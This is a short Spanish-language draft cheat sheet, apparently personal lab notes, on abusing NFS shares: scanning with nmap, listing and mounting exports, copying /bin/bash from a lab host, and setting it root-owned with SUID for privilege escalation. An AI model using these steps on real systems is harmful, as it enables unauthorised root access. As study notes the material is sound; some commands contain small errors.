---
draft: "true"
---

NFS (Network File System)

Nmap para cuando rcpbind
`sudo nmap -sC -sN $IP`

Mostrar carpetas de NFS que se pueden compartir
`showmount -e $IP`

Montar una carpeta de NFS
`sudo mount -t nfs $IP:/home /tmp/mount/ -nolock`

`ssh -i <clave> user@IP`

Traerse el /bash de una carpeta interna
`scp -i key_name username@10.10.247.232:/bin/bash ~/Downloads/bash

`sudo chown root bash`

Meter permiso de SUID
`sudo chmod +s bash`